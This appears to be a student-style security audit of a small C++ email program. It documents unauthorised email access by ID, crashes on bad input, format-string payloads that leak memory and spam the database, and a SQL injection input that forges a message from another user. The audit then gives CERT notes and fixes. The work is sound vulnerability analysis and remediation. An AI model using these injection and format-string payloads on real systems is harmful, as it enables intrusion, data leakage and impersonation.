Unintended behaviors with normal inputs

    Design Flaw: All users have access to other user's emails

    If you log in as a normal user and select to read an email you will be preseneted with the number of emails that exist in the database and asked to enter an email id. This id is the actual id stored in the database so a user could enter an id that belongs to an email of another user and attempt to read it. Here we log in as teddy and attempt to read an email sent from alp to kevin!

    $ ./geemail
    Please enter 0 for register or 1 for login: 1
    Please enter your username: teddy
    Please enter your password: password
    You logged in successfully!
    ID = 1
    SENDER = alp
    TITLE = Hello Teddy

    Number of Emails: 3
    Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 1
    Please enter an email id: 2
    Please enter a secret passphrase: secret
    Your message: Hello Alp, this is Kevin!
    Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 2

    Program sends unintended corrupted email, creates unintended user, and crashes when input is a character

    When you run the program, if you input any character as your choice, the program will create a blank user into the database and send a corrputed email. If you try this a second time, the program will get stuck in a loop trying to create this blank user until it crashes. To demo this we use the character a
    First Run

    $ ./geemail
    Please enter 0 for register or 1 for login: a
    Please enter a new username: Please enter your password: Number of Emails: 0
    Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: Please enter your recipient: Please enter your title: Please enter your secret passphrase: Enter the message 
    Your Message: 
    Message Sent :)
    Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: Please enter an email id: Please enter a secret passphrase: Your message: 
    Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: #

    Database shows new user created and corrupted email sent id = 4

    sqlite> select * from emails; select * from users;
    1|teddy|alp|Hello Teddy|F2C6108389DAF19A54250A255A03A81522917E84F3D3BC4CEF
    2|alp|kevin|Hello Alp|F2C6108389DAE493406D537D121EB35C38C237BCB6E4B952EF
    3|kevin|teddy|Hello Kevin|F2CA5C84838CCC911C611B660D57A10E34916E98A6ADF54CEB68E7EB68DAC1DFE906
    4||||P�
    1|teddy|5E884898DA28047151D0E56F8DC6292773603D0D6AABBDD62A11EF721D1542D8
    2|alp|5E884898DA28047151D0E56F8DC6292773603D0D6AABBDD62A11EF721D1542D8
    3|kevin|5E884898DA28047151D0E56F8DC6292773603D0D6AABBDD62A11EF721D1542D8
    4||E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855

    Second Run

    $ ./geemail
    Please enter 0 for register or 1 for login: a
    Please enter a new username: User already exists. Try again.
    Please enter a new username: User already exists. Try again.
    Please enter a new username: User already exists. Try again.
    ...

    Program received signal SIGSEGV, Segmentation fault.
    0x00007fff8b91733b in unixOpen () from /usr/lib/libsqlite3.dylib

Program is vulnerable to string format exploit

    Program crash after attempting to modify object after being freed

    If you log in as a normal user and select to read an email but use C format strings in the passphrase input, the program attempts to modify the object after being freed
    Input

    $ ./geemail
    Please enter 0 for register or 1 for login: 1
    Please enter your username: teddy
    Please enter your password: password
    You logged in successfully!
    ID = 1
    SENDER = alp
    TITLE = Hello Teddy

    Number of Emails: 3
    Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 1
    Please enter an email id: 1
    Please enter a secret passphrase: %x%p%x%n%p%p%p%p

    osx Output

    Please enter a secret passphrase: %x%p%x%n%p%p%p%p
    geemail(48247,0x7fff7b3b1000) malloc: *** error for object 0x7feb63403220: incorrect checksum for freed object - object was probably modified   after being freed.
    *** set a breakpoint in malloc_error_break to debug
    [1]    48247 abort      ./geemail

    cloud9 output

    Please enter a secret passphrase: %x%p%x%n%p%p%p%p
    *** Error in `./geemail': free(): invalid next size (fast): 0x00000000006db7e0 ***
    Aborted

    Program leaks memory and sends massive spam emails after reading email containing string format variables

    If you log in as a normal user and send an email that contains string format variables, when any user reads that email, data can be leaked and massive spam emails could be sent. For this demo we use this as our string format test %p%p%p%p%p%n.

    $ ./geemail
    Please enter 0 for register or 1 for login: 1
    Please enter your username: teddy
    Please enter your password: password
    You logged in successfully!
    ID = 1
    SENDER = alp
    TITLE = Hello Teddy

    Number of Emails: 3
    Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 0
    Please enter your recipient: teddy
    Please enter your title: %p%p%p%p%p%n %p%p%p%p%p%n
    Please enter your secret passphrase: secret
    Enter the message
    hello %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n
    Your Message: hello %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n
    Message Sent :)
    Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 2

    $ ./geemail
    Please enter 0 for register or 1 for login: 1
    Please enter your username: teddy
    Please enter your password: password
    You logged in successfully!
    ID = 1
    SENDER = alp
    TITLE = Hello Teddy

    Number of Emails: 3
    Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 1
    Please enter an email id: 49
    Please enter a secret passphrase: secret
    Your message: hello %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%ngmail.db

    Here we can see gmail.db is revealed which is the actual name for the database file. Each run may reveal other informaion, such as the current directory of the application, etc. At this point, the application is in a state that can't process the string format variables properly. If you input any character when asked to read, write, or quit, that user will send massive spam emails until memory is exhausted and program crashes. The database file increases in size quite quickly.

    Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: a
    Please enter your recipient: Please enter your title: Please enter your secret passphrase: Enter the message
    Your Message:
    Message Sent :)
    Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: Please enter an email id: Please enter a secret passp��hǱ�]`:Z�#��essage: \^k
                 b!é��M�|�(�ްb��!�H:R߅�]l Ԏ�
                                           �ٶe��G��r@&�@�+�\���\Jgmail.db
    Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: Please enter your recipient: Please enter your title: Please enter your secret passphrase: Enter the message
    Your Message:
    Message Sent :)
    Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: Please enter an email id: Please enter a secret passp��hǱ�]`:Z�#��essage: \^k
                 b!é��M�|�(�ްb��!�H:R߅�]l Ԏ�
                                           �ٶe��G��r@&�@�+�\���\J
    Message Sent :)
    Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: Please enter your recipient: Please enter your title: Please enter your secret passphrase: Enter the message
    Your Message:
    geemail(83110,0x7fff7b3b1000) malloc: *** error for object 0x103001560: incorrect checksum for freed object - object was probably modified after being freed.
    *** set a breakpoint in malloc_error_break to debug
    [New Thread 0x3583 of process 83110]

    Thread 1 received signal SIGABRT, Aborted.
    0x00007fff9fbb4f06 in __pthread_kill () from /usr/lib/system/libsystem_kernel.dylib
    $

    Now if we look at the database, we will see over 10,000 emails were sent and stored with corrupted data:

    select * from emails;
    ...
    12306||teddy||�m�
    12307||teddy||���
    12308||teddy||���
    12309||teddy||���
    12310||teddy||�@�

Progarm is vulnerable to SQL injection

    All queries use quotations around variables

    An example of this is seen on line 425:

    string query = "INSERT INTO EMAILS (RECIPIENT, SENDER, TITLE, MESSAGE) VALUES ('" + recip + "', '" + username + "', '" + title + "', '" + decryptedMess + "');";

    In this example we will log in as teddy and send an email to kevin from alp. We will send the message Hello kevin, this is alp... but is this really alp? encrypted with salsa20 using the IV of AAAAAAAA and passphrase secret. The application does not randomize the IV and uses AAAAAAAA.

    $ ./geemail
    Please enter 0 for register or 1 for login: 1
    Please enter your username: teddy
    Please enter your password: password
    You logged in successfully!
    ID = 1
    SENDER = alp
    TITLE = Hello Teddy

    Number of Emails: 3
    Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 0
    Please enter your recipient: teddy teddy',''); SELECT * FROM emails; INSERT INTO emails (RECIPIENT, SENDER, TITLE, MESSAGE) VALUES ("kevin","alp","hello kevin","F2C6108389DACE9A46281D255A03A81522917E84F3F3BC4CE036ECBB2FDF908FA51B5566F68ED16764E2A2FC94622345BD1641"); SELECT * FROM emails;--
    Please enter your title: Please enter your secret passphrase: blah blah
    Enter the message
    Your Message: blah
    ID = 1
    RECIPIENT = teddy
    SENDER = alp
    TITLE = Hello Teddy
    MESSAGE = F2C6108389DAF19A54250A255A03A81522917E84F3D3BC4CEF

    ID = 2
    RECIPIENT = alp
    SENDER = kevin
    TITLE = Hello Alp
    MESSAGE = F2C6108389DAE493406D537D121EB35C38C237BCB6E4B952EF

    ID = 3
    RECIPIENT = kevin
    SENDER = teddy
    TITLE = Hello Kevin
    MESSAGE = F2CA5C84838CCC911C611B660D57A10E34916E98A6ADF54CEB68E7EB68DAC1DFE906

    ID = 4
    RECIPIENT = teddy
    SENDER = teddy
    TITLE = teddy
    MESSAGE =

    ID = 1
    RECIPIENT = teddy
    SENDER = alp
    TITLE = Hello Teddy
    MESSAGE = F2C6108389DAF19A54250A255A03A81522917E84F3D3BC4CEF

    ID = 2
    RECIPIENT = alp
    SENDER = kevin
    TITLE = Hello Alp
    MESSAGE = F2C6108389DAE493406D537D121EB35C38C237BCB6E4B952EF

    ID = 3
    RECIPIENT = kevin
    SENDER = teddy
    TITLE = Hello Kevin
    MESSAGE = F2CA5C84838CCC911C611B660D57A10E34916E98A6ADF54CEB68E7EB68DAC1DFE906

    ID = 4
    RECIPIENT = teddy
    SENDER = teddy
    TITLE = teddy
    MESSAGE =

    ID = 5
    RECIPIENT = kevin
    SENDER = alp
    TITLE = hello kevin
    MESSAGE = F2C6108389DACE9A46281D255A03A81522917E84F3F3BC4CE036ECBB2FDF908FA51B5566F68ED16764E2A2FC94622345BD1641

    Message Sent :)
    Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 2
    $

    If successful, then kevin should be able to log in and see a new message from alp. Logging in as kevin this is what we saw :)

    $ ./geemail
    Please enter 0 for register or 1 for login: 1
    Please enter your username: kevin
    Please enter your password: password
    You logged in successfully!
    ID = 5
    SENDER = alp
    TITLE = hello kevin

    ID = 3
    SENDER = teddy
    TITLE = Hello Kevin

    Number of Emails: 3
    Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 1
    Please enter an email id: 5
    Please enter a secret passphrase: secret
    Your message: Hello kevin, this is alp... but is this really alp?
    Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 2
    $

CERT Rule Recommendations

        MEM31-C. Free dynamically allocated memory when no longer needed

        char * returnBuffer = (char *) malloc(txtLength*2);

        memset(returnBuffer, 0, txtLength*2);
        for (index = 0; index<txtLength; index++) {
            sprintf(returnBuffer + index*2, "%02X", (unsigned char)encBuffer[index]);
        }
        string result(returnBuffer);
        free(encBuffer);
        return result;

    From line 199 to 207, they allocated returnBuffer but forgot free it.

        STR31-C. Guarantee that storage for strings has sufficient space for character data and the null terminator

        for (index = 0; index<32; index++) {
            sprintf(buffer + index*2, "%02X", (unsigned char)hashBuffer[index]);
        }

    Line 329-331,here sprintf() function makes no guarantees regarding the length of the generated string.

        MSC24-C. Do not use deprecated or obsolescent functions

        strcpy() was used in many places of the application, it is recommended to use strcpy_s() instead

        EXP05-CPP. Do not use C-style casts

        Throughout the application, both (c style) and <c++ style> casts were used. It is recommended that you use <c++ style> casts.

Recommended Fixes to Vulnerabilities

    Character Input Fix
    Modify loginOrRegister() and readOrWrite()

    string loginOrRegister() {
            // Prompt user for “login” or “register”
            int isLogin;
            cout << "Please enter 0 for register or 1 for login: ";
            cin >> isLogin;
            if (isLogin) {
                    if(login()){
                            cout<< "You logged in successfully!" <<endl;
                    }
                    else{
                            cout << "Wrong info!" <<endl;
                            loginOrRegister();
                    }
            }
            else{
                    username = registerUser();
            }
            return username;
    }

    int readOrWrite() {
            //Return 1 if they want to read, 0 if they want to write;
            int rorW;
            cout << "Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: ";
            cin >> rorW;
            return rorW;
    }

    updated loginOrRegister()

    string loginOrRegister() {
            // Prompt user for “login” or “register”
            string isLogin;
            cout << "Please enter 0 for register or 1 for login: ";
            cin >> isLogin;
            if (!isLogin.compare("1")) {
                    if(login()){
                            cout<< "You logged in successfully!" <<endl;
                    }
                    else{
                            cout << "Wrong info!" <<endl;
                            loginOrRegister();
                    }
            }
            else if(!isLogin.compare("0")){
                    username = registerUser();
            }
            else {
              cin.clear();
              cout << "\n";
              loginOrRegister();
            }
            return username;
    }

    int readOrWrite() {
            //Return 1 if they want to read, 0 if they want to write;
            string choice;
            cout << "Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: ";
            cin >> choice;
            if (!choice.compare("0")) {
              return 0;
            } else if (!choice.compare("1")){
              return 1;
            } else if (!choice.compare("2")) {
              return 2;
            } else {
              cin.clear();
              cout << "\n";
              readOrWrite();
            }
            return -1;
    }

    String Vulnerability Fix
    Simply replace all printf() commands with cout <<
    SQL Injection Fix
    Use prepared statements or bind parameters
